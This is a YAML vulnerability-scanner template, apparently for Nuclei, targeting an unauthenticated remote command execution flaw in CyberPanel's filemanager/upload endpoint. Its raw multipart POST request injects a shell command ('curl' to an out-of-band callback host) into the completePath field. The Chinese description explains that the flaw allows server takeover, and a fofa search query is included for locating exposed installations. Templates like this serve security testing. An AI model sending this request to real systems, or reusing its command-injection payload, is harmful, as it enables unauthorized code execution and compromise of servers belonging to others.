http:
    - matchers:
        - part: interactsh_protocol
          type: word
          words:
            - dns
      raw:
        - |
          POST /filemanager/upload HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
          Content-Type: multipart/form-data; boundary=----NewBoundary123456789

          ------NewBoundary123456789
          Content-Disposition: form-data; name="domainName"

          <target>
          ------NewBoundary123456789
          Content-Disposition: form-data; name="completePath"

          curl http://{{interactsh-url}}
          ------NewBoundary123456789
          Content-Disposition: form-data; name="file"; filename="poc.txt"

          pwn
          ------NewBoundary123456789--
id: CyberPanel-filemanager_upload-rce
info:
    author: Superhero
    description: |-
        fofa: app="CyberPanel"
        该漏洞源于filemanager/upload接口未做身份验证和参数过滤，未授权的攻击者可以通过此接口远程加载恶意文件获取服务器权限，从而造成数据泄露、服务器被接管等严重的后果。目前该漏洞技术细节与EXP已在互联网上公开，鉴于该漏洞影响范围较大，建议用户尽快做好自查及防护。
    name: CyberPanel filemanager/upload 远程命令执行漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489060&idx=1&sn=3dcf695d7bea75def3b195d0cabcf36f&chksm=c267a317f5102a01f55a969ce5bd719262f13e9d7d5ad3225467c0847578949a60e13e7b3a37&token=314927155&lang=zh_CN#rd
    severity: high
    tags:
        - CyberPanel
